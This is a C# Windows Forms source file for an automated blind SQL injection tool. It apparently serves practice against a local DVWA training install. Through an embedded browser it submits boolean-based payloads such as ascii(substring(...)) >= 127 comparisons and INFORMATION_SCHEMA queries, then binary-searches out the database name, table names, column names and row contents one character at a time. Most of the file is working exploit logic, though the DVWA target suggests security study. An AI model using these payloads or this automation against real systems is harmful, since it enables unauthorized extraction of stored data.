using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Tool_SqlInjectionBlind_Dvwa
{
    public partial class frm_Main : Form
    {
        public frm_Main()
        {
            InitializeComponent();
            this.vp = new Tool_SqlInjectionBlind_Dvwa.ViewProcess();
            vp.Show();

            wbro_Brower.Navigate("http://localhost/dvwa/login.php");

            wbro_Brower.ScriptErrorsSuppressed = true;
        }

        HtmlDocument html_Document_Current;

        private string html;

        #region Creating drag form by pnl_ControlBar
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void pnl_Header_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }
        #endregion

        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);

        private void btn_Power_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("App will be shutdown. Are you sure?", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                System.Windows.Forms.Application.Exit();
        }

        private void btn_ViewHTHL_Click(object sender, EventArgs e)
        {
            frm_ViewHTML view_HTML = new frm_ViewHTML(this.html);
            view_HTML.ShowDialog();
        }

        private void PutData(string sql)
        {
            vp.rtxt_View.Text += sql + Environment.NewLine;
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("id")[0].SetAttribute("value", sql); //coplete data to textbox
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click"); // call event click button submit
        }

        bool btn_Click = false;
        bool is_Done = false;

        private void Init_DataTable()
        {
            for (int tb = 0; tb < Variable.Quantity_Tables; tb++)
            {
                List<List<string>> data_table = new List<List<string>>();
                for (int row = 0; row < Variable.Quantity_Row[tb]; row++)
                {
                    List<string> data_row = new List<string>();
                    for (int col = 0; col < Variable.Quantity_Columns[tb]; col++)
                    {
                        data_row.Add("");
                    }
                    data_table.Add(data_row);
                }
                Variable.Bd_DataTable.Add(data_table);
            }
        }

        private void Change_IndexCols_Whent_GetDataTable()
        {
            while (true)
            {
                if (Variable.Index_Tables >= Variable.Quantity_Tables)
                {
                    return;
                }
                else
                {
                    if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                    {
                        Variable.Index_Columns = 0;
                        Variable.Index_Rows++;
                        if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                        {
                            Variable.Index_Rows = 0;
                            Variable.Index_Tables++;
                        }
                    }
                    else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
                    {
                        Variable.Index_Columns++;
                    }
                    else
                        break;
                }
            }
        }

        private DataTable Fill_Data_To_DataTable()
        {
            DataTable d_table = new DataTable(cmb_Tables.Text);
            DataColumn d_col;
            DataRow d_row;

            for (int col = 0; col < Variable.Quantity_Columns[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)]; col++)
            {
                d_col = new DataColumn(Variable.Db_ColumnsName[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][col]);
                d_table.Columns.Add(d_col);
            }

            for (int row = 0; row < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)].Count; row++)
            {
                d_row = d_table.NewRow();
                for (int col = 0; col < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row].Count; col++)
                {
                    d_row[col] = Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row][col];
                }
                d_table.Rows.Add(d_row);
            }
            return d_table;
        }

        private void wbro_Brower_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            txt_Url.Text = wbro_Brower.Url.ToString();
            html = wbro_Brower.DocumentText;

            html_Document_Current = wbro_Brower.Document;

            if (btn_Click)
            {
                ResultRequest.Result result = Handing.GetResultSubmit(html_Document_Current);
                ResultRequest.Job work_state = ResultRequest.Job.None;

                int left, mid, right, index;
                string str_result, sql;
                left = mid = right = index = 0;
                str_result = sql = "";

                Variable.Get_Data_Variable(ref left, ref mid, ref right, ref index, ref str_result, ref sql);

                work_state = Handing.Get_Result_Respond(result, ref sql, ref left, ref right, ref mid, ref str_result);

                Variable.Set_Data_Variable(left, mid, right, index, str_result, sql);

                if (work_state == ResultRequest.Job.Done_ALL)
                {
                    if(Confirm.Is_Click_btnGDatabaseName)
                    {
                        Confirm.Is_Click_btnGDatabaseName = false;
                        btn_Click = false;
                        btn_GetDBName.Enabled = false;
                        Variable.Left = 0; Variable.Right = 255; Variable.Mid = 127; Variable.Index_str = 0;
                        Variable.Str_result = "";
                        return;
                    }
                    else if(Confirm.Is_Click_btnGNameTables)
                    {
                        if(Confirm.Count_Tables_Done) // print table name
                        {
                            Variable.Index_str = 0;
                            if (Variable.Index_Tables < Variable.Quantity_Tables)
                            {
                                Variable.Index_Tables++;
                                lbl_TBsName.Text += "     ";
                                Variable.Left = 0; Variable.Right = 255; Variable.Mid = 127;
                                btn_GetTBsName.PerformClick();
                                return;
                            }
                            else // all done
                            {
                                Variable.Index_str = 0;
                                Confirm.Is_Click_btnGNameTables = false;
                                btn_Click = false;

                                cmb_TbsName.Items.Add(Variable.Db_TablesName);
                                return;
                            }
                        }
                        else
                        {
                            lbl_Count_TBsName.Text += Variable.Str_result;
                            Variable.Quantity_Tables = Convert.ToInt32(Variable.Str_result);
                            Confirm.Count_Tables_Done = true;

                            Variable.Reset_Data_Variable();

                            btn_GetTBsName.PerformClick();
                            return;
                        }
                        
                    }
                    else if(Confirm.Is_Click_btnGNameColumns)
                    {
                        if(Confirm.Find_Quantity_Done)
                        {
                            Variable.Index_Columns++;
                            if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                            {
                                Variable.Index_Columns = 0;
                                Variable.Index_Tables++;
                            }

                            Variable.Reset_Data_Variable();

                            btn_GetColsName.PerformClick();
                            return;
                        }
                        else
                        {
                            Variable.Quantity_Columns[Variable.Index_Tables] = Convert.ToInt32(Variable.Str_result);
                            Variable.Str_result = "";
                            Variable.Index_Tables++;

                            Variable.Reset_Data_Variable();

                            btn_GetColsName.PerformClick();
                            return;
                        }
                    }
                    else if(Confirm.Is_Click_btnGetData)
                    {
                        if(Confirm.Find_Quantity_Row_Done.Contains(false)) //don't complete
                        {
                            Variable.Quantity_Row[Variable.Index_Tables] = Convert.ToInt32(Variable.Str_result);
                            Confirm.Find_Quantity_Row_Done[Variable.Index_Tables] = true;

                            Variable.Reset_Data_Variable();
                            btn_GetData.PerformClick();

                            return;
                        }
                        else
                        {
                            Variable.Index_Columns++;

                            if(Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                            {
                                Variable.Index_Columns = 0;
                                Variable.Index_Rows++;
                                if(Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                                {
                                    Variable.Index_Rows = 0;
                                    Variable.Index_Tables++;
                                }
                            }
                            else
                            {
                                Change_IndexCols_Whent_GetDataTable();
                            }
                            Variable.Reset_Data_Variable();
                            btn_GetData.PerformClick();
                            return;
                        }
                    }
                }
                else if(work_state == ResultRequest.Job.Done_OnePart)
                {
                    if (Confirm.Is_Click_btnGDatabaseName)
                    {
                        lbl_Result_DBName.Text += Variable.Str_result;
                        Variable.Db_Name += Variable.Str_result;

                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DB_Name);
                    }
                    else if(Confirm.Is_Click_btnGNameTables)
                    {
                        Variable.Db_TablesName[Variable.Index_Tables] += Variable.Str_result;
                        lbl_TBsName.Text += Variable.Str_result;
                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.TABLES_NAME);
                    }
                    else if(Confirm.Is_Click_btnGNameColumns)
                    {
                        Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] += Variable.Str_result;
                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.COLUMNS_NAME);
                    }
                    else if(Confirm.Is_Click_btnGetData)
                    {
                        Variable.Bd_DataTable[Variable.Index_Tables][Variable.Index_Rows][Variable.Index_Columns] += Variable.Str_result;
                        Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DATA_TABLE);
                        
                        dgv_Data.DataSource = Fill_Data_To_DataTable();
                    }
                    PutData(Variable.Sql_Request);
                }
                else if(work_state == ResultRequest.Job.Continue)
                {   
                    PutData(Variable.Sql_Request);
                }
            }

        }

        private void btn_Go_Click(object sender, EventArgs e)
        {
            if(txt_Url.Text == String.Empty)
            {
                txt_Url.Focus();
            }
            else
            {
                wbro_Brower.Url = new Uri(txt_Url.Text);
            }
        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            btn_Click = true;
            Confirm.Is_Click_btnGDatabaseName = true;

            Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT DATABASE()), 0,1))) >= 127 #";

            Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DB_Name);

            PutData(Variable.Sql_Request);

            btn_GetDBName.Enabled = false;
        }


        private void btn_GetTBsName_Click(object sender, EventArgs e)
        {
            btn_Click = true;

            Confirm.Is_Click_btnGNameTables = true;

            if (Confirm.Count_Tables_Done)
            {
                if(Variable.Db_TablesName.Count == 0)
                {
                   for(int run = 0; run < Variable.Quantity_Tables; run++)
                    {
                        Variable.Db_TablesName.Add("");
                    }
                }
                Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                if (Variable.Index_Tables < Variable.Quantity_Tables)
                {
                    int index = Variable.Index_str;
                    Variable.Sql_Request = Variable.Sql_Request.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                    Variable.Index_str = index;

                    PutData(Variable.Sql_Request);
                }
                else
                {
                    foreach(string str in Variable.Db_TablesName)
                    {
                        lbl_TBsName.Text += " '" + str + "'";
                    }
                    Variable.Reset_Data_Variable();

                    btn_GetTBsName.Enabled = false;
                    Confirm.Is_Click_btnGNameTables = false;
                    Confirm.Count_Tables_Done = false;
                    Variable.Str_result = "";
                }
            }
            else
            {
                Variable.Index_Tables = 0;

                Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE 'dvwa') >= 127 #";

                PutData(Variable.Sql_Request);
            }

        }

        private void btn_GetColsName_Click(object sender, EventArgs e)
        {
            if(Variable.Quantity_Tables != 0)
            {
                btn_Click = true;
                Confirm.Is_Click_btnGNameColumns = true;


                if(Confirm.Find_Quantity_Done) //had quantity
                {
                    if(Variable.Db_ColumnsName.Count == 0)
                    {
                        for(int row = 0; row < Variable.Quantity_Tables; row++)
                        {
                            List<string> temp = new List<string>();
                            for(int col = 0; col < Variable.Quantity_Columns[row]; col++)
                            {
                                temp.Add("");
                            }
                            Variable.Db_ColumnsName.Add(temp);
                        }
                        Variable.Index_Columns = Variable.Index_Tables = 0;
                        Variable.Index_str = 0;
                    }
                    //ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                    
                    if(Variable.Index_Tables < Variable.Quantity_Tables)
                    {
                        Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "' LIMIT 0, 1), 0, 1))) >= 127 #";
                        if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                        {
                            Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.COLUMNS_NAME);

                            PutData(Variable.Sql_Request);
                        }
                    }
                    else
                    {
                        cmb_Tables.Items.Add("ALL");
                        foreach (string str in Variable.Db_TablesName)
                        {
                            cmb_TbsName.Items.Add(str);
                            cmb_Tables.Items.Add(str);
                        }
                        cmb_TbsName.SelectedIndex = 0;
                        cmb_Tables.SelectedIndex = 0;

                        foreach(List<string> ls in Variable.Db_ColumnsName)
                        {
                            foreach(string str in ls)
                            {
                                clb_ColsName.Items.Add(str, true);
                            }
                        }

                        btn_GetTBsName.Enabled = false;
                        btn_Click = false;
                        Variable.Index_Columns = Variable.Index_Tables = 0;
                        Confirm.Is_Click_btnGNameColumns = false;
                        Variable.Reset_Data_Variable();

                        return;
                    }
                }
                else // count quantity
                {
                    if (Variable.Quantity_Columns.Count == 0)
                    {
                        Variable.Index_Tables = 0;
                        for (int run = 0; run < Variable.Quantity_Tables; run++)
                        {
                            Variable.Quantity_Columns.Add(0);
                        }

                    }
                    if(Variable.Index_Tables < Variable.Quantity_Tables)
                    {

                        //sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE 'guestbook') >= 127 #";
                        Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "') >= 127 #";

                        PutData(Variable.Sql_Request);
                    }
                    else //find done
                    {
                        Confirm.Find_Quantity_Done = true;

                        Variable.Index_Tables = 0;
                        Variable.Index_Columns = 0;
                        btn_GetColsName.PerformClick();
                        return;
                    }
                }
            }
        }

        private void btn_GetData_Click(object sender, EventArgs e)
        {
            if (Variable.Db_TablesName.Count != 0) //find tables name done
            {
                if (Variable.Db_ColumnsName[0].Count != 0) //find columns name done
                {
                    btn_Click = true;
                    Confirm.Is_Click_btnGetData = true;

                    if (Confirm.Find_Quantity_Row_Done.Count != 0 && !Confirm.Find_Quantity_Row_Done.Contains(false))
                    {
                        if (Variable.Bd_DataTable.Count == 0)
                        {
                            Init_DataTable();
                            Variable.Index_Columns = Variable.Index_Rows = Variable.Index_Tables = 0;
                        }

                        while (true)
                        {
                            if (Variable.Index_Tables >= Variable.Quantity_Tables)
                            {
                                List<List<List<string>>> a = Variable.Bd_DataTable;

                                Variable.Index_Tables = Variable.Index_Columns = Variable.Index_Rows = 0;
                                Variable.Reset_Data_Variable();

                                return;
                            }
                            else
                            {
                                if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                                {
                                    Variable.Index_Columns = 0;
                                    Variable.Index_Rows++;
                                    if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                                    {
                                        Variable.Index_Rows = 0;
                                        Variable.Index_Tables++;
                                    }
                                }
                                else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
                                {
                                    Variable.Index_Columns++;
                                }
                                else
                                    break;
                            }
                        }

                        Variable.Sql_Request = "1' AND ascii(lower(substring((SELECT " + Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] + " from dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + " LIMIT 0, 1), 0, 1))) >= 127 #";
                        if (Variable.Index_Tables < Variable.Quantity_Tables)
                        {
                            if (Variable.Index_Rows < Variable.Quantity_Row[Variable.Index_Tables])
                            {
                                if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                                {
                                    Variable.Sql_Request = Handing.Change_Sql_Get_Next_Char(ResultRequest.Mode_SQL.DATA_TABLE);

                                    PutData(Variable.Sql_Request);
                                }
                            }
                            else
                            {
                                List<List<List<string>>> a = Variable.Bd_DataTable;
                            }

                        }
                    }
                    else //count quantity don't complete
                    {
                        if (Confirm.Find_Quantity_Row_Done.Count == 0)
                        {
                            for (int run = 0; run < Variable.Quantity_Tables; run++)
                            {
                                Confirm.Find_Quantity_Row_Done.Add(false);
                                Variable.Quantity_Row.Add(0);
                            }
                            Variable.Index_Tables = 0;
                            Variable.Str_result = "";
                            Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";

                            PutData(Variable.Sql_Request);
                        }
                        else
                        {

                            for (int run = 0; run < Confirm.Find_Quantity_Row_Done.Count; run++)
                            {
                                if (Confirm.Find_Quantity_Row_Done[run] == false)
                                {
                                    Variable.Index_Tables = run;
                                    break;
                                }
                            }
                            //count row
                            Variable.Str_result = "";
                            Variable.Sql_Request = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";

                            PutData(Variable.Sql_Request);

                        }
                    }
                }
            }
        }

        private void cmb_TbsName_SelectedIndexChanged(object sender, EventArgs e)
        {
            cmb_Cols_Name.Items.Clear();
            if(cmb_TbsName.Items.Count != 0)
            {
                for(int index_val = 0; index_val < Variable.Db_ColumnsName[cmb_TbsName.SelectedIndex].Count; index_val++)
                {
                    cmb_Cols_Name.Items.Add(Variable.Db_ColumnsName[cmb_TbsName.SelectedIndex][index_val]);
                }
                cmb_Cols_Name.SelectedIndex = 0;
            }
        }

        private void cmb_Tables_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmb_Tables.SelectedIndex != 0)
            {
                for (int idex = 0; idex < clb_ColsName.Items.Count; idex++) //uncheck
                {
                    clb_ColsName.SetItemChecked(idex, false);
                }

                for (int idex = 0; idex < Variable.Quantity_Columns[cmb_Tables.SelectedIndex - 1]; idex++)
                {
                    int aaa = clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[cmb_Tables.SelectedIndex - 1][idex]);
                    clb_ColsName.SetItemChecked(aaa, true);
                }
            }
            else // index == 0 // all
            {
                for(int idex= 0; idex < clb_ColsName.Items.Count; idex++)
                {
                    clb_ColsName.SetItemChecked(idex, true);
                }
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void cmb_Cols_Name_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
